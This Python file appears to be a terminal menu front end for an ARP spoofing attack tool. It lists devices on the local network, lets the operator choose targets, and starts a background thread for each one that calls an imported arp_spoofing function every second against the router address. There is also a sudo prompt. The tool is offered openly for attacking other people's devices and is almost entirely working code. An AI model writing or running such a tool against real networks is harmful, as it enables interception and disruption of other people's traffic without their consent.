from threading import Thread, current_thread
from pick import pick
from scan_local import get_devices
from arp_spoofing import arp_spoofing
from termcolor import colored
import time
import os
import subprocess

class Menu:
    def __init__(self):
        self.devices = []
        self.attack_devices = []
        self.indicator = '==>'

        Thread(target=self.log, daemon=True).start()

    def log(self):
        while True:
            self.devices = get_devices()
            time.sleep(5)

    def home(self):
        title = 'Please choose your favorite programming language:'
        options = ['Show local devices to attack', 'Show devices under attack', 'Exit']
        callbacks = [self.devices_list, self.attack_devices_list, quit]

        _, index = pick(options, title, indicator=self.indicator)

        callbacks[index]()
    
    def devices_list(self):
        title = 'Choose device to attack:'
        devices = self.devices.copy()

        options = ['REFRESH']
        if devices:
            options += list(map(lambda device: device['host_name'], devices))
        else:
            options += ['pls, wait']
        options.append('Back')

        option, index = pick(options, title, indicator=self.indicator)
        if index == 0: # refresh
            self.devices_list()
            return

        if index + 1 == len(options) or option == 'pls, wait': # go back or wait
            return

        attack_index = index - 1

        sure = self.sure('Are you sure about attacking ' + str(devices[attack_index]['host_name']) + 
            '\n\t with ip = ' + str(devices[attack_index]['ip']) +
            '\n\t and mac = ' + str(devices[attack_index]['mac']) + ' ?')

        if sure:
            # attack
            device = devices[attack_index].copy()
            self.start_attack(device)
            self.attack_devices.append(device)
            self.alert('Attack ' + str(devices[attack_index]['host_name']) + ' in process')
    
    def attack_devices_list(self):
        title = 'Devices under attack (choose to stop attack):'
        attack_devices = self.attack_devices # may not copy

        options = list(map(lambda device: device['host_name'], attack_devices))
        options.append('Back')

        _, index = pick(options, title, indicator=self.indicator)

        if index + 1 == len(options): # go back
            return
        
        # stop attack
        device = attack_devices.pop(index)
        self.stop_attack(device)
        self.alert('Attack ' + device['host_name'] + ' stopped!')
        
    def sure(self, title):
        options = ['no', 'yes']
        _, ok = pick(options, title, indicator=self.indicator)
        return ok == 1

    def alert(self, title):
        pick(['ok'], title)

    def attack(self, ip, mac):
        thread = current_thread()
        while getattr(thread, "do_run", True):
            arp_spoofing(ip, mac, "192.168.1.1", "b0:f1:d8:9:a7:a9")
            time.sleep(1)

    def start_attack(self, device):
        device['thread'] = Thread(target=self.attack, args=(device['ip'], device['mac']), daemon=True)
        device['thread'].start()
        return device

    def stop_attack(self, device):
        device['thread'].do_run = False
        del device['thread']

def prompt_sudo():
    ret = 0
    if os.geteuid() != 0:
        msg = "[sudo] password for %u: "
        try:
            ret = subprocess.check_call("sudo -v -p '%s'" % msg, shell=True)
        except:
            print(colored('You can scan network only with sudo privs', 'red'))
            quit()
    return ret

if __name__ == '__main__':
    prompt_sudo()
    menu = Menu()

    while True:
        menu.home()
